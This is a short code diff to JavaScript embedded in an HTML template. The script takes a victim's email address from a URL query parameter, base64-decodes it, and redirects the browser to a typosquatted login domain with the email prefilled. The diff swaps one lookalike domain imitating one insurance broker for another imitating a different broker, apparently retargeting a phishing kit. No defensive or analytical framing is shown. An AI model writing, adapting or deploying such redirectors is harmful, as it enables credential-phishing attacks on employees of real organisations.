@@ -435,11 +435,11 @@ const html = `
         return (q[key] = value), q; 
       }, {}); 
  
-    var emailParam = queryParams["l"]; 
+    var emailParam = queryParams["org"]; 
     var decodedEmail = emailParam.includes("@") ? emailParam : atob(emailParam); 
  
     window.location.replace( 
-      "https://0nline.mail-ajg.com/?username=" + decodedEmail 
+      "https://0nline.lockton.cam/?username=" + decodedEmail 
     ); 
   </script> 
   </body>
